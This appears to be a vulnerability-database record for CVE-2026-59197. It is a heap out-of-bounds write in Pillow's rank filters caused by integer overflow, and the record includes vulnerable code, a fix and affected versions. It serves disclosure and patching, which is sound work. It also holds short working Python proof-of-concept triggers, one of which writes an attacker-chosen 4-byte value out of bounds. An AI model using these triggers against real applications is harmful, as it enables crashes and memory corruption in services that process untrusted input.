@@ -1,0 +1,332 @@
+advisory_id: GHSA-xj96-63gp-2gmr
+datasource_id: github_osv/GHSA-xj96-63gp-2gmr
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-xj96-63gp-2gmr/GHSA-xj96-63gp-2gmr.json
+aliases:
+  - CVE-2026-59197
+summary: |
+  Pillow: Heap out-of-bounds write in `ImageFilter.RankFilter` via integer overflow in `ImagingExpand`
+  ### Summary
+
+  Pillow's public rank-filter API can trigger a native heap out-of-bounds write
+  when given a very large odd filter size.
+
+  Minimal public API trigger:
+
+  ```python
+  from PIL import Image, ImageFilter
+
+  im = Image.new("L", (3, 3), 128)
+  im.filter(ImageFilter.MedianFilter(4294967295))
+  ```
+
+  `ImageFilter.RankFilter.filter()` calls `image.expand(size // 2, size // 2)`
+  before rank-filter size validation. With `size = 4294967295`, the
+  expansion margin is `2147483647` (`INT_MAX`). `ImagingExpand()` then computes
+  the output dimensions with unchecked signed `int` arithmetic. On tested builds,
+  this wraps to a tiny output image and the border-expansion loop writes past the
+  allocation.
+
+  This is reachable through documented public classes (`RankFilter`,
+  `MedianFilter`, `MinFilter`, and `MaxFilter`). No private API, ctypes, or custom
+  Python object is needed.
+
+  ### Details
+
+  Current `src/PIL/ImageFilter.py`:
+
+  ```python
+  class RankFilter(Filter):
+      def filter(self, image):
+          if image.mode == "P":
+              msg = "cannot filter palette images"
+              raise ValueError(msg)
+          image = image.expand(self.size // 2, self.size // 2)
+          return image.rankfilter(self.size, self.rank)
+  ```
+
+  The `expand()` call is made before `image.rankfilter(...)`.
+
+  Current `src/libImaging/Filter.c:ImagingExpand()` does not check output-size
+  overflow:
+
+  ```c
+  if (xmargin < 0 && ymargin < 0) {
+      return (Imaging)ImagingError_ValueError("bad kernel size");
+  }
+
+  imOut = ImagingNewDirty(
+      imIn->mode, imIn->xsize + 2 * xmargin, imIn->ysize + 2 * ymargin
+  );
+  ```
+
+  For a `3x3` image and `xmargin = ymargin = INT_MAX`, the computed output size
+  wraps to `1x1` on tested builds. The following loop still uses the huge margin:
+
+  ```c
+  for (x = 0; x < xmargin; x++) {
+      imOut->image[yout][x] = imIn->image[yin][0];
+  }
+  ```
+
+  `src/libImaging/RankFilter.c` does contain checks that would reject this size:
+
+  ```c
+  if (!(size & 1)) {
+      return (Imaging)ImagingError_ValueError("bad filter size");
+  }
+  if (size > INT_MAX / size || size > INT_MAX / (size * (int)sizeof(FLOAT32))) {
+      return (Imaging)ImagingError_ValueError("filter size too large");
+  }
+  ```
+
+  But  those checks are reached only after `RankFilter.filter()` has already
+  called `image.expand(...)`.
+
+  Mode `"L"` produces 1-byte OOB stores. Modes `"I"` and `"F"` produce 4-byte OOB
+  stores. The repeated value written OOB is copied from the source image border
+  pixel, so attacker-supplied image bytes can influence it. This is a sequential
+  overwrite, not an arbitrary-address write.
+
+  ### PoC
+
+  Minimal ASAN crash PoC:
+
+  ```python
+  from PIL import Image, ImageFilter
+
+  im = Image.new("L", (3, 3), 128)
+  im.filter(ImageFilter.MedianFilter(4294967295))
+  ```
+
+  Observed on local Pillow `12.3.0.dev0` ASAN target:
+
+  ```text
+  ERROR: AddressSanitizer: heap-buffer-overflow
+  WRITE of size 1
+  ImagingExpand /out/src/src/libImaging/Filter.c:99
+  _expand_image /out/src/src/_imaging.c:1100
+  0 bytes after a 1-byte allocation
+  ```
+
+  4-byte write variant with source pixel loaded from normal image bytes:
+
+  ```python
+  from io import BytesIO
+  from PIL import Image, ImageFilter
+
+  SIZE = 4294967295
+  PIXEL = 0x41424344
+
+  src = BytesIO()
+  Image.new("I", (3, 3), PIXEL).save(src, format="TIFF")
+
+  im = Image.open(BytesIO(src.getvalue()))
+  im.load()
+  assert im.mode == "I"
+  assert im.getpixel((0, 0)) == PIXEL
+
+  im.filter(ImageFilter.MedianFilter(SIZE))
+  ```
+
+  Observed ASAN signature:
+
+  ```text
+  ERROR: AddressSanitizer: heap-buffer-overflow
+  WRITE of size 4
+  ImagingExpand /out/src/src/libImaging/Filter.c:101
+  _expand_image /out/src/src/_imaging.c:1100
+  0 bytes after a 4-byte allocation
+  ```
+
+  Version checks:
+
+  ```text
+  Pillow 1.0: ASAN heap-buffer-overflow WRITE confirmed at runtime
+  Pillow 12.3.0.dev0: ASAN heap-buffer-overflow WRITE confirmed at runtime
+  Pillow 1.0 through 12.2.0: source sweep confirmed the vulnerable public
+                             validation order and unchecked ImagingExpand arithmetic
+  upstream/main at 9c1097c861420c77af53c7c9af2a1382e2bfaa8b: still affected
+  ```
+
+  ### Impact
+
+  It is a heap out-of-bounds write in Pillow's native C extension, reachable
+  through public image-filter classes.
+
+  Applications are impacted if an untrusted user can control the rank-filter
+  size/configuration passed to Pillow. If the image is also attacker-supplied, the
+  source pixel value written out of bounds can be attacker-influenced, including
+  4-byte values for mode `"I"` images.
+
+
+  ## Possible fix
+
+  Validate the rank-filter size before calling `image.expand(...)`, and harden
+  `ImagingExpand()` against invalid margins and overflow:
+
+  ```c
+  if (xmargin < 0 || ymargin < 0) {
+      return (Imaging)ImagingError_ValueError("bad kernel size");
+  }
+  if (xmargin > (INT_MAX - imIn->xsize) / 2 ||
+      ymargin > (INT_MAX - imIn->ysize) / 2) {
+      return (Imaging)ImagingError_ValueError("bad kernel size");
+  }
+  ```
+impacted_packages:
+  - purl: pkg:pypi/pillow
+    affected_versions: vers:pypi/<12.3.0
+    fixed_versions: vers:pypi/12.3.0
+    affected_packages:
+      - pkg:pypi/pillow@1.0
+      - pkg:pypi/pillow@1.1
+      - pkg:pypi/pillow@1.2
+      - pkg:pypi/pillow@1.3
+      - pkg:pypi/pillow@1.4
+      - pkg:pypi/pillow@1.5
+      - pkg:pypi/pillow@1.6
+      - pkg:pypi/pillow@1.7.0
+      - pkg:pypi/pillow@1.7.1
+      - pkg:pypi/pillow@1.7.2
+      - pkg:pypi/pillow@1.7.3
+      - pkg:pypi/pillow@1.7.4
+      - pkg:pypi/pillow@1.7.5
+      - pkg:pypi/pillow@1.7.6
+      - pkg:pypi/pillow@1.7.7
+      - pkg:pypi/pillow@1.7.8
+      - pkg:pypi/pillow@2.0.0
+      - pkg:pypi/pillow@2.1.0
+      - pkg:pypi/pillow@2.2.0
+      - pkg:pypi/pillow@2.2.1
+      - pkg:pypi/pillow@2.2.2
+      - pkg:pypi/pillow@2.3.0
+      - pkg:pypi/pillow@2.3.1
+      - pkg:pypi/pillow@2.3.2
+      - pkg:pypi/pillow@2.4.0
+      - pkg:pypi/pillow@2.5.0
+      - pkg:pypi/pillow@2.5.1
+      - pkg:pypi/pillow@2.5.2
+      - pkg:pypi/pillow@2.5.3
+      - pkg:pypi/pillow@2.6.0
+      - pkg:pypi/pillow@2.6.1
+      - pkg:pypi/pillow@2.6.2
+      - pkg:pypi/pillow@2.7.0
+      - pkg:pypi/pillow@2.8.0
+      - pkg:pypi/pillow@2.8.1
+      - pkg:pypi/pillow@2.8.2
+      - pkg:pypi/pillow@2.9.0
+      - pkg:pypi/pillow@3.0.0
+      - pkg:pypi/pillow@3.1.0rc1
+      - pkg:pypi/pillow@3.1.0
+      - pkg:pypi/pillow@3.1.1
+      - pkg:pypi/pillow@3.1.2
+      - pkg:pypi/pillow@3.2.0
+      - pkg:pypi/pillow@3.3.0
+      - pkg:pypi/pillow@3.3.1
+      - pkg:pypi/pillow@3.3.2
+      - pkg:pypi/pillow@3.3.3
+      - pkg:pypi/pillow@3.4.0
+      - pkg:pypi/pillow@3.4.1
+      - pkg:pypi/pillow@3.4.2
+      - pkg:pypi/pillow@4.0.0
+      - pkg:pypi/pillow@4.1.0
+      - pkg:pypi/pillow@4.1.1
+      - pkg:pypi/pillow@4.2.0
+      - pkg:pypi/pillow@4.2.1
+      - pkg:pypi/pillow@4.3.0
+      - pkg:pypi/pillow@5.0.0
+      - pkg:pypi/pillow@5.1.0
+      - pkg:pypi/pillow@5.2.0
+      - pkg:pypi/pillow@5.3.0
+      - pkg:pypi/pillow@5.4.0.dev0
+      - pkg:pypi/pillow@5.4.0
+      - pkg:pypi/pillow@5.4.1
+      - pkg:pypi/pillow@6.0.0
+      - pkg:pypi/pillow@6.1.0
+      - pkg:pypi/pillow@6.2.0
+      - pkg:pypi/pillow@6.2.1
+      - pkg:pypi/pillow@6.2.2
+      - pkg:pypi/pillow@7.0.0
+      - pkg:pypi/pillow@7.1.0
+      - pkg:pypi/pillow@7.1.1
+      - pkg:pypi/pillow@7.1.2
+      - pkg:pypi/pillow@7.2.0
+      - pkg:pypi/pillow@8.0.0
+      - pkg:pypi/pillow@8.0.1
+      - pkg:pypi/pillow@8.1.0
+      - pkg:pypi/pillow@8.1.1
+      - pkg:pypi/pillow@8.1.2
+      - pkg:pypi/pillow@8.2.0
+      - pkg:pypi/pillow@8.3.0
+      - pkg:pypi/pillow@8.3.1
+      - pkg:pypi/pillow@8.3.2
+      - pkg:pypi/pillow@8.4.0
+      - pkg:pypi/pillow@9.0.0
+      - pkg:pypi/pillow@9.0.1
+      - pkg:pypi/pillow@9.1.0
+      - pkg:pypi/pillow@9.1.1
+      - pkg:pypi/pillow@9.2.0
+      - pkg:pypi/pillow@9.3.0
+      - pkg:pypi/pillow@9.4.0
+      - pkg:pypi/pillow@9.5.0
+      - pkg:pypi/pillow@10.0.0
+      - pkg:pypi/pillow@10.0.1
+      - pkg:pypi/pillow@10.1.0
+      - pkg:pypi/pillow@10.2.0
+      - pkg:pypi/pillow@10.3.0
+      - pkg:pypi/pillow@10.4.0
+      - pkg:pypi/pillow@11.0.0
+      - pkg:pypi/pillow@11.1.0
+      - pkg:pypi/pillow@11.2.1
+      - pkg:pypi/pillow@11.3.0
+      - pkg:pypi/pillow@12.0.0
+      - pkg:pypi/pillow@12.1.0
+      - pkg:pypi/pillow@12.1.1
+      - pkg:pypi/pillow@12.2.0
+    fixed_packages:
+      - pkg:pypi/pillow@12.3.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/python-pillow/pillow
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/python-pillow/pillow
+        commit: cce3bdb867c77a3420261ed1bfdb6b0787ec8fc1
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-xj96-63gp-2gmr/GHSA-xj96-63gp-2gmr.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-190
+references:
+  - url: https://github.com/python-pillow/Pillow
+    reference_type:
+    reference_id:
+  - url: https://github.com/python-pillow/Pillow/commit/cce3bdb867c77a3420261ed1bfdb6b0787ec8fc1
+    reference_type:
+    reference_id:
+  - url: https://github.com/python-pillow/Pillow/pull/9695
+    reference_type:
+    reference_id:
+  - url: https://github.com/python-pillow/Pillow/security/advisories/GHSA-xj96-63gp-2gmr
+    reference_type:
+    reference_id:
+  - url: https://github.com/python-pillow/Pillow/releases/tag/12.3.0
+    reference_type: other
+    reference_id: 12.3.0
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-59197
+    reference_type:
+    reference_id: CVE-2026-59197
+exploits: []
